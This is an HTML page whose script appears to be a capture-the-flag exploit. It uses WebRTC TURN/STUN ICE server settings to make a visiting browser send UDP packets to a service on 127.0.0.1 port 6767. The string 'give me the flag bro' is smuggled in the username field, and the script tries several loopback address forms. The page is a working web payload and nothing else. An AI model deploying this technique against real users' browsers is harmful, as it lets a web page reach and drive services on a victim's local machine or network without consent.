<!DOCTYPE html>
<html>
<head>
    <title>Talk To Your Locals</title>
</head>
<body>
    <h1>Establishing Loopback Communication...</h1>
    <script>
        // The target string must match exactly up to the newline character
        const payload = "give me the flag bro\n";

        function sendLocalUdp(targetUrl) {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{
                        urls: targetUrl,
                        username: payload,
                        credential: "x"
                    }]
                });
                pc.createDataChannel("chat");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            } catch(e) {}
        }

        // We flood multiple loopback notations to ensure it maps correctly inside the container network stack
        sendLocalUdp("turn:127.0.0.1:6767?transport=udp");
        sendLocalUdp("stun:127.0.0.1:6767");
        sendLocalUdp("turn:[::ffff:127.0.0.1]:6767?transport=udp");
        sendLocalUdp("stun:[::ffff:127.0.0.1]:6767");
    </script>
</body>
</html>
